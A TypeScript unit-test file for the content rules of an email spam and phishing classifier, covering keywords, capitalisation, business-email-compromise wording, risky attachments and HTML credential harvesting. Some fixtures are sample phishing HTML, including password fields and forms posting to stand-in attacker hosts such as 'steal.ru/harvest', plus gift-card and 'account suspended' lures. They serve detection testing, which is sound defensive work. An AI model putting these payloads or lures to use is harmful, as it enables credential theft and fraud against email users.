// ─────────────────────────────────────────────────────────────────────────────
// content.rules.spec.ts
// Unit tests for ContentRules — Rules 1+2, 4, 5, 6, 8, 14, 15, 22
// ─────────────────────────────────────────────────────────────────────────────

import { ContentRules } from '../rules/content.rules';
import { EmailContentForClassification } from '../classification.service';

const rules = new ContentRules();

function makeEmail(overrides: Partial<EmailContentForClassification>): EmailContentForClassification {
  return {
    subject:  'Hello',
    fromAddr: 'sender@example.com',
    bodyText: '',
    ...overrides,
  };
}

function check(email: Partial<EmailContentForClassification>): { score: number; phishingScore: number; reasons: string[] } {
  const reasons: string[] = [];
  // FIX: ContentRules.check() بترجع { spamScore, phishingScore } بعد الـ refactor
  const result = rules.check(makeEmail(email), reasons);
  return { score: result.spamScore, phishingScore: result.phishingScore, reasons };
}

// ─────────────────────────────────────────────────────────────────────────────
// Rule 1+2 — Spam Keywords + Fuzzy Match
// ─────────────────────────────────────────────────────────────────────────────
describe('Rule 1+2 — Spam Keywords', () => {
  it('✅ flags "free money" in body', () => {
    const { score, reasons } = check({ bodyText: 'Congratulations! You won free money today.' });
    expect(score).toBeGreaterThan(0);
    expect(reasons).toContain('spam_keywords_detected');
  });

  it('✅ flags fuzzy variant "fr-ee money"', () => {
    const { reasons } = check({ bodyText: 'Get fr-ee money now!' });
    expect(reasons).toContain('spam_keywords_detected');
  });

  it('✅ flags "guaranteed" keyword', () => {
    const { reasons } = check({ bodyText: 'This is a guaranteed offer just for you.' });
    expect(reasons).toContain('spam_keywords_detected');
  });

  it('❌ does NOT flag clean business email', () => {
    const { reasons } = check({ bodyText: 'Hi John, please find the report attached. Thanks.' });
    expect(reasons).not.toContain('spam_keywords_detected');
  });

  it('❌ does NOT flag keyword in fromAddr (FIX: body-only check)', () => {
    // "work" in domain should NOT trigger spam keywords
    const { reasons } = check({
      fromAddr: 'hr@free-work.com',
      bodyText: 'Meeting at 3pm tomorrow.',
    });
    expect(reasons).not.toContain('spam_keywords_detected');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Rule 4 — Excessive CAPS
// ─────────────────────────────────────────────────────────────────────────────
describe('Rule 4 — Excessive CAPS', () => {
  it('✅ flags ALL CAPS subject and body', () => {
    const { score, reasons } = check({
      subject:  'YOU HAVE WON A PRIZE',
      bodyText: 'CLAIM YOUR REWARD NOW IMMEDIATELY',
    });
    expect(score).toBeGreaterThan(0);
    expect(reasons).toContain('excessive_capitalization');
  });

  it('❌ does NOT flag normal mixed case', () => {
    const { reasons } = check({
      subject:  'Meeting Tomorrow',
      bodyText: 'Hi Sarah, please review the attached document.',
    });
    expect(reasons).not.toContain('excessive_capitalization');
  });

  it('❌ does NOT flag short all-caps abbreviations (low ratio)', () => {
    const { reasons } = check({
      subject:  'FYI: Update',
      bodyText: 'Please review this FYI note and respond by EOD.',
    });
    expect(reasons).not.toContain('excessive_capitalization');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Rule 5 — Excessive Exclamation Marks
// ─────────────────────────────────────────────────────────────────────────────
describe('Rule 5 — Excessive Exclamation Marks', () => {
  it('✅ flags 4+ exclamation marks', () => {
    const { score, reasons } = check({ bodyText: 'Win now! Act fast! Limited offer! Claim today! Free!' });
    expect(score).toBeGreaterThan(0);
    expect(reasons).toContain('excessive_exclamation_marks');
  });

  it('❌ does NOT flag 2 exclamation marks', () => {
    const { reasons } = check({ bodyText: 'Great news! See you tomorrow!' });
    expect(reasons).not.toContain('excessive_exclamation_marks');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Rule 8 — Urgent / Threatening Language
// ─────────────────────────────────────────────────────────────────────────────
describe('Rule 8 — Urgent Phishing Language', () => {
  it('✅ flags "account suspended"', () => {
    const { reasons } = check({ bodyText: 'Your account has been suspended. Verify now.' });
    expect(reasons).toContain('urgent_phishing_language');
  });

  it('✅ flags "verify your account"', () => {
    const { reasons } = check({ bodyText: 'Please verify your account within 24 hours.' });
    expect(reasons).toContain('urgent_phishing_language');
  });

  it('✅ flags "unusual activity detected"', () => {
    const { reasons } = check({ bodyText: 'We detected suspicious activity on your account.' });
    expect(reasons).toContain('urgent_phishing_language');
  });

  it('❌ does NOT flag neutral business language', () => {
    const { reasons } = check({ bodyText: 'Please review the quarterly report at your convenience.' });
    expect(reasons).not.toContain('urgent_phishing_language');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Rule 14 — BEC Language
// ─────────────────────────────────────────────────────────────────────────────
describe('Rule 14 — BEC Language', () => {
  it('✅ flags wire transfer request', () => {
    const { score, reasons } = check({
      fromAddr: 'boss@unknown-corp.net',
      bodyText: 'Please process an urgent wire transfer to our vendor today.',
    });
    expect(score).toBeGreaterThan(0);
    expect(reasons).toContain('bec_language_detected');
  });

  it('✅ flags gift card request', () => {
    const { reasons } = check({
      fromAddr: 'ceo@random-domain.com',
      bodyText: 'I need you to buy some gift cards urgently. Keep this confidential.',
    });
    expect(reasons).toContain('bec_language_detected');
  });

  it('✅ higher score with multiple BEC patterns', () => {
    const { score } = check({
      fromAddr: 'director@unknown.net',
      bodyText: 'Urgent wire transfer needed. Keep this confidential. Do not tell anyone. Process this payment.',
    });
    expect(score).toBeGreaterThan(10);
  });

  it('❌ does NOT flag normal invoice from known sender', () => {
    const { reasons } = check({
      fromAddr: 'billing@amazon.com',
      bodyText: 'Your invoice is attached. Please process payment at your earliest convenience.',
    });
    expect(reasons).not.toContain('bec_language_detected');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Rule 15 — Attachment Risk
// ─────────────────────────────────────────────────────────────────────────────
describe('Rule 15 — Attachment Risk', () => {
  it('✅ flags .exe attachment', () => {
    const { score, reasons } = check({
      bodyText: 'Please run the installer.',
      attachments: [{ filename: 'setup.exe', mimeType: 'application/octet-stream' }],
    });
    expect(score).toBeGreaterThan(0);
    expect(reasons).toContain('risky_attachment_detected');
  });

  it('✅ flags macro-enabled Excel + financial body', () => {
    const { reasons } = check({
      bodyText: 'Please review the invoice and process the payment.',
      attachments: [{ filename: 'Invoice.xlsm', mimeType: 'application/vnd.ms-excel.sheet.macroEnabled.12' }],
    });
    expect(reasons).toContain('risky_attachment_detected');
  });

  it('✅ amplifies score with urgency + risky attachment', () => {
    const withUrgency = check({
      bodyText: 'Your account will be suspended. Please verify immediately.',
      attachments: [{ filename: 'verify.bat', mimeType: 'application/octet-stream' }],
    });
    const withoutUrgency = check({
      bodyText: 'Please open the file.',
      attachments: [{ filename: 'file.bat', mimeType: 'application/octet-stream' }],
    });
    expect(withUrgency.score).toBeGreaterThan(withoutUrgency.score);
  });

  it('❌ does NOT flag safe PDF with no financial context', () => {
    const { reasons } = check({
      bodyText: 'Please find the meeting notes attached.',
      attachments: [{ filename: 'notes.pdf', mimeType: 'application/pdf' }],
    });
    expect(reasons).not.toContain('risky_attachment_detected');
  });

  it('❌ does NOT flag email with no attachments', () => {
    const { reasons } = check({ bodyText: 'Hello, how are you?' });
    expect(reasons).not.toContain('risky_attachment_detected');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Rule 22 — HTML Credential Harvesting
// ─────────────────────────────────────────────────────────────────────────────
describe('Rule 22 — Credential Harvesting', () => {
  it('✅ flags password input field in HTML body', () => {
    const { phishingScore, reasons } = check({
      bodyHtml: '<p>Enter your credentials:</p><input type="password" placeholder="Password"/>',
    });
    expect(phishingScore).toBeGreaterThanOrEqual(40);
    expect(reasons).toContain('credential_harvesting_attempt');
  });

  it('✅ flags form submitting to external URL', () => {
    const { phishingScore, reasons } = check({
      bodyHtml: '<form action="https://evil-site.ru/steal" method="POST"><input type="text"/></form>',
    });
    expect(phishingScore).toBeGreaterThan(0);
    expect(reasons).toContain('credential_harvesting_attempt');
  });

  it('✅ flags form submitting to IP address (extra penalty)', () => {
    const { phishingScore } = check({
      bodyHtml: '<form action="https://192.168.1.1/steal"><input type="text"/></form>',
    });
    expect(phishingScore).toBeGreaterThanOrEqual(25);
  });

  it('✅ flags generic form tag', () => {
    const { reasons } = check({
      bodyHtml: '<form><input type="text" name="user"/></form>',
    });
    expect(reasons).toContain('credential_harvesting_attempt');
  });

  it('❌ does NOT flag clean HTML without forms', () => {
    const { reasons } = check({
      bodyHtml: '<p>Hello <b>John</b>, please <a href="https://company.com">click here</a>.</p>',
    });
    expect(reasons).not.toContain('credential_harvesting_attempt');
  });

  it('❌ does NOT flag Google Forms embed (whitelisted action domain)', () => {
    // Google Forms بيستخدم external form action شرعية — مش phishing
    // كان بيجيب +30 قبل الـ fix
    const { reasons } = check({
      bodyHtml: '<form action="https://forms.google.com/d/e/abc123/formResponse"><input type="text" name="feedback"/></form>',
    });
    expect(reasons).not.toContain('credential_harvesting_attempt');
  });

  it('✅ flags external form with password input with higher score than without', () => {
    // external form + password input = more suspicious than external form alone
    const { phishingScore: withPassword } = check({
      bodyHtml: '<form action="https://steal.ru/harvest"><input type="password"/></form>',
    });
    const { phishingScore: withoutPassword } = check({
      bodyHtml: '<form action="https://steal.ru/harvest"><input type="text"/></form>',
    });
    expect(withPassword).toBeGreaterThan(withoutPassword);
  });

  it('✅ credential_harvesting goes to phishingScore not spamScore', () => {
    // credential harvesting هو phishing attack — يجب يروح لـ phishingScore
    const { score: spamScore, phishingScore } = check({
      bodyHtml: '<form action="https://steal.ru/phish"><input type="password"/></form>',
    });
    expect(phishingScore).toBeGreaterThan(0);
    // لا يروح للـ spam score
    expect(spamScore).toBe(0);
  });
});
